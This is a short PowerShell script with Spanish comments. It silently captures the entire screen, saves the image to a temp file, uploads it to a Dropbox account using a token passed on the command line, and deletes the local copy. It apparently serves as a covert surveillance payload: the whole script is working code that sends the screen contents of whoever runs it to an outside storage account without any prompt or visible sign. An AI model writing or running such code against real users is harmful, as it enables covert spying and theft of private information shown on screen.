$token = $args[0]  # Acepta el token como argumento

# Función para subir un archivo a Dropbox
function DropBox-Upload {
    param (
        [string]$SourceFilePath
    )
    $outputFile = Split-Path $SourceFilePath -leaf;
    $TargetFilePath = "/$outputFile";
    $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }';
    $authorization = "Bearer " + $token;
    $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]";
    $headers.Add("Authorization", $authorization);
    $headers.Add("Dropbox-API-Arg", $arg);
    $headers.Add("Content-Type", 'application/octet-stream');
    Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers;
}

# Cargar System.Windows.Forms y tomar una captura de pantalla
Add-Type -AssemblyName System.Windows.Forms;
$screen = [System.Windows.Forms.SystemInformation]::VirtualScreen;
$bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height;
$graphics = [System.Drawing.Graphics]::FromImage($bitmap);
$graphics.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $screen.Size);

# Guardar la captura de pantalla en un archivo temporal
$filePath = "$env:temp\sc.png";
$bitmap.Save($filePath, [System.Drawing.Imaging.ImageFormat]::Png);
$graphics.Dispose();
$bitmap.Dispose();

# Subir la captura de pantalla a Dropbox
DropBox-Upload -SourceFilePath $filePath;

# Eliminar el archivo temporal
Remove-Item -Path $filePath;

